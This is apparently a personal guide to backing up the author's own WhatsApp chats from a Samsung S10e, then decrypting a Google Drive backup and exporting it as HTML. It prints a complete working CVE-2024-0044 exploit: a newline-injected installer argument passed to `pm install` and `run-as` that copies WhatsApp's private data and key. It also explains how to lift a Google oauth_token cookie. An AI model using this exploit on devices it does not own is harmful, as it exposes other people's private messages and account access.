+++
title = "WhatsApp backup: Samsung S10e key extraction, Google Drive download, HTML export"
date = 2026-08-22
description = "This document describes the workflow I used to back up my own WhatsApp data on a **Samsung Galaxy S10e (SM-G970F)**, Android 12, security patch **2023-03-01**."
draft = false
+++

This document describes the workflow I used to back up my own WhatsApp data on a **Samsung Galaxy S10e (SM-G970F)**, Android 12, security patch **2023-03-01**.

| Step | Tool | Purpose |
|------|------|---------|
| 1 | [CVE-2024-0044](https://tinyhack.com/2024/06/07/extracting-whatsapp-database-or-any-app-data-from-android-12-13-using-cve-2024-0044/) | Extract `key` + live `msgstore.db` from the phone (no root) |
| 2 | [whatsapp-backup-downloader-decryptor](https://github.com/giacomoferretti/whatsapp-backup-downloader-decryptor) (`wabdd`) | Download the Google Drive backup |
| 3 | [Whatsapp-Chat-Exporter](https://github.com/KnugiHK/Whatsapp-Chat-Exporter) (`wtsexporter`) | Decrypt `msgstore.db.crypt14` with the extracted `key` and generate HTML |

My backup was **not** end-to-end encrypted. The chat database on Drive is `msgstore.db.crypt14`. The key file is 158 bytes at `com.whatsapp/files/key`.

> **Note:** `wabdd decrypt` only supports E2E `.crypt15` backups. For `.crypt14` (my case), decryption and HTML export are done with **Whatsapp-Chat-Exporter**, which handles crypt12/14/15.

The CVE exploit is read-only; uninstall the injected APK afterward if desired. This guide is for backing up **your own** data on **your own** device.

## The plan with my current S10e

### Exploit — get `key` and live `msgstore.db`

Based on the [tinyhack tutorial](https://tinyhack.com/2024/06/07/extracting-whatsapp-database-or-any-app-data-from-android-12-13-using-cve-2024-0044/). Read-only on the phone: no root, no wipe. Requires security patch **≤ 2024-02-01**.

#### Device check

```text
$ adb devices -l
List of devices attached
RF8M611RMJZ            device usb:1-1 product:beyond0lteeea model:SM_G970F device:beyond0 transport_id=3

$ adb shell getprop ro.build.version.security_patch
2023-03-01

$ adb shell getprop ro.build.version.release
12

$ adb shell pm list packages -U | grep com.wha
package:com.whatsapp uid:10247
```

#### Download APK and create payload

```bash
curl -L -o F-Droid.apk "https://f-droid.org/F-Droid.apk"
ls -lh F-Droid.apk    # must be ~12 MB, not 12 KB

cat > payload.txt <<'EOF'
@null
victim 10247 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null
EOF
```

Replace `10247` with your WhatsApp `uid` from `pm list packages -U | grep com.wha`. The newline after `@null` is required — use a file instead of pasting into `adb shell`.

#### Run the exploit

```bash
adb push F-Droid.apk /data/local/tmp/
adb push payload.txt /data/local/tmp/
adb shell
```

Inside `adb shell`:

```sh
PAYLOAD="$(cat /data/local/tmp/payload.txt)"
pm install -i "$PAYLOAD" /data/local/tmp/F-Droid.apk
# Expected: Success

mkdir -p /data/local/tmp/wa
touch /data/local/tmp/wa/wa.tar
chmod -R 0777 /data/local/tmp/wa

run-as victim
# ls . may show "Permission denied" — normal
ls /data/data/com.whatsapp
tar -cf /data/local/tmp/wa/wa.tar com.whatsapp
exit
exit
```

Verify on device:

```sh
ls -l /data/local/tmp/wa/wa.tar
# ~270 MB
```

#### Pull and extract on PC

```bash
adb pull /data/local/tmp/wa/wa.tar
mkdir -p wa_extract
tar -xf wa.tar -C wa_extract

ls -la wa_extract/com.whatsapp/files/key
ls -la wa_extract/com.whatsapp/databases/msgstore.db
```

My results:

```text
-rw------- 1 thomas users   158 Nov  6  2019 wa_extract/com.whatsapp/files/key
-rw------- 1 thomas users 84676608 Aug 22 13:28 wa_extract/com.whatsapp/databases/msgstore.db
```

- **`key`** (158 bytes) — decrypts `msgstore.db.crypt14` from Google Drive.
- **`msgstore.db`** — live database, already decrypted (optional sanity check with WCE).
- **`wa.db`** — contact names (optional, for nicer HTML).

Keep `wa.tar`, `key`, and databases private.


### Drive — download with wabdd, decrypt and export HTML with Whatsapp-Chat-Exporter

#### Install tools

```bash
pip install wabdd
pip install whatsapp-chat-exporter[android_backup]
```

`android_backup` adds support for decrypting Android backups (crypt12/14/15).

#### Get Google `oauth_token`

Password login often fails (`BadAuthentication`). Use the browser cookie method from the [wabdd README](https://github.com/giacomoferretti/whatsapp-backup-downloader-decryptor#getting-the-oauth_token):

1. Open https://accounts.google.com/EmbeddedSetup
2. Log in with the Google account used in WhatsApp → Settings → Chats → Chat backup.
3. Click **I agree** (page may spin forever — that is fine).
4. DevTools (F12) → **Application** → **Cookies** → `https://accounts.google.com`
5. Copy the **`oauth_token`** cookie value.

#### Download the backup with wabdd

```bash
mkdir -p ~/wa-backup/tokens ~/wa-backup/backups
cd ~/wa-backup

# Interactive: paste oauth_token when prompted
wabdd token thomas@gmail.com

# Or save the token manually to tokens/thomas@gmail.com_token.txt

wabdd download --token-file tokens/thomas@gmail.com_token.txt
```

Expected layout after download (paths may vary slightly):

```text
backups/33601234567/
├── Backups/
│   ├── backup_settings.json.crypt14
│   ├── chatsettingsbackup.db.crypt14
│   ├── wa.db.crypt14
│   └── ...
├── Databases/
│   └── msgstore.db.crypt14
├── Media/
│   ├── WhatsApp Images/
│   ├── WhatsApp Video/
│   ├── WhatsApp Audio/
│   ├── WhatsApp Documents/
│   ├── WhatsApp Voice Notes/
│   └── ...
└── metadata.json
```

Media files are **not** encrypted. Only the databases need the `key`.

#### Prepare working directory for Whatsapp-Chat-Exporter

```bash
mkdir -p ~/wa-backup/working
cd ~/wa-backup/working

# Key from CVE exploit
cp ~/Desktop/wa_extract/com.whatsapp/files/key .

# Encrypted chat DB from wabdd download
cp ~/wa-backup/backups/33601234567/Databases/msgstore.db.crypt14 .

# Contact DB (decrypt wa.db.crypt14 with same key, or copy from phone tar)
cp ~/Desktop/wa_extract/com.whatsapp/databases/wa.db .

# Media from Drive download
cp -r ~/wa-backup/backups/33601234567/Media ./WhatsApp
```

Working directory should look like:

```text
working/
├── key
├── msgstore.db.crypt14
├── wa.db
└── WhatsApp/
    ├── WhatsApp Images/
    ├── WhatsApp Video/
    └── ...
```

#### Decrypt and generate HTML (one command)

Whatsapp-Chat-Exporter decrypts crypt14 and writes HTML + linked media:

```bash
cd ~/wa-backup/working
wtsexporter -a -k key -b msgstore.db.crypt14 -w wa.db -m WhatsApp -o result
```

Open `result/index.html` in a browser.

Useful options:

```bash
wtsexporter -a -k key -b msgstore.db.crypt14 -w wa.db -m WhatsApp -o result -c
# -c  move media into output folder (portable archive)

wtsexporter -a -k key -b msgstore.db.crypt14 -w wa.db -m WhatsApp -o result -j
# -j  also export JSON

wtsexporter --help
```

#### Optional — export from live phone DB (no decrypt)

If you only want the most current local state (from the CVE tar):

```bash
mkdir -p ~/wa-backup/working_live
cd ~/wa-backup/working_live
cp ~/Desktop/wa_extract/com.whatsapp/databases/msgstore.db .
cp ~/Desktop/wa_extract/com.whatsapp/databases/wa.db .
cp -r ~/wa-backup/backups/33601234567/Media ./WhatsApp

wtsexporter -a -w wa.db -m WhatsApp -o result_live
```

## End-to-end flow (summary)

```
S10e (CVE-2024-0044)
  └─> key (158 B) + msgstore.db + wa.db

Google (oauth_token + wabdd download)
  └─> msgstore.db.crypt14 + Media/

Whatsapp-Chat-Exporter
  └─> wtsexporter -a -k key -b msgstore.db.crypt14 -w wa.db -m WhatsApp -o result
  └─> result/index.html
```

## After backup — moving to a new phone

1. Verify HTML reports in `result/`.
2. WhatsApp → **Transfer chats** (QR) to the new device.
3. Trigger a fresh Google Drive backup on the new phone.
4. Store `key`, `wa.tar`, tokens, and reports in encrypted storage.

Enabling **End-to-end encrypted backup** with a **64-digit key** (written down once) avoids future key extraction on patched Android. That was not required for my setup (non-E2E, crypt14 only).
